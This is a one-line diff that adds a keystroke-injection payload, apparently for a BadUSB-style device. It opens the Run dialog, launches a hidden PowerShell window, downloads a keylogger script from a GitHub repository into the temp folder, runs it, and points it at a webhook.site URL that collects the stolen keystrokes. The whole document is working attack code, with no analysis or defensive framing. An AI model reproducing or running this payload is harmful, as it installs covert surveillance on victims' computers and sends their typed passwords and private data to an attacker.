@@ -1,0 +1,1 @@
+<GCMD>r<time2>powershell<time2><RET><time2>Start-Process powershell -ArgumentList "-WindowStyle Hidden -Command Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/gamkers/insta-shares/refs/heads/main/keylogger/key.ps1' -OutFile '$env:TEMP\key.ps1'; & '$env:TEMP\key.ps1' -webhookUrl 'https://webhook.site/83905b93-e0d2-4e38-92be-6e8fb352cd2c'";Exit<RET>
